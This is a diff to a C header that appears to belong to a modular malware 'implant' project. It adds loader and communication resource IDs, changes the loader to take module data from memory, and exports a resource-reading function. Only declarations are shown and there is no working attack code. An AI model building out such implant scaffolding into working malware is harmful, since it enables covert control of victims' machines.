@@ -28,11 +28,20 @@
 
 enum MODULAR_IMPLANT_RESOURCE_IDS
 {
-	Loader,
+	MIRID_Loader,
+	MIRID_Communication
 };
 
+typedef struct _LOADED_MODULE
+{
+	HMODULE	hModule;
+	PWSTR	pwszModuleFileName;
+} LOADED_MODULE, * PLOADED_MODULE;
+
 typedef VOID(*IMPLANT_FUNC) ();
-typedef VOID(*IMPLANT_LOADER) (LPCWSTR wszLibFileName, PVOID* lpOptArgs);
+typedef BOOL(*IMPLANT_LOADER) (_In_ PVOID pModuleData,
+	_In_ DWORD cbModuleLen,
+	_Out_ PLOADED_MODULE pLoadedModule);
 
 typedef struct _IMPLANT_CONFIG
 {
@@ -42,12 +51,6 @@ typedef struct _IMPLANT_CONFIG
 typedef VOID(*IMPLANT_CALLBACK)(PIMPLANT_CONFIG pImplantConfig,
 	IMPLANT_FUNC fnFunc,
 	enum MODULAR_IMPLANT_RESOURCE_IDS iFuncType);
-
-typedef struct _LOADED_MODULE
-{
-	HMODULE	hModule;
-	PWSTR	pwszModuleFileName;
-} LOADED_MODULE, *PLOADED_MODULE;
 
 BOOL
 GetRandomPrefixW(
@@ -70,3 +73,11 @@ WriteDataToFile(
 	LPCWSTR wszFileName,
 	PVOID pData,
 	DWORD dwDataLen);
+
+__declspec(dllexport)
+BOOL
+GetResourceData(
+	HMODULE hModule,
+	INT iResourceId,
+	PVOID* ppResourceData,
+	PDWORD pdwResourceSize);
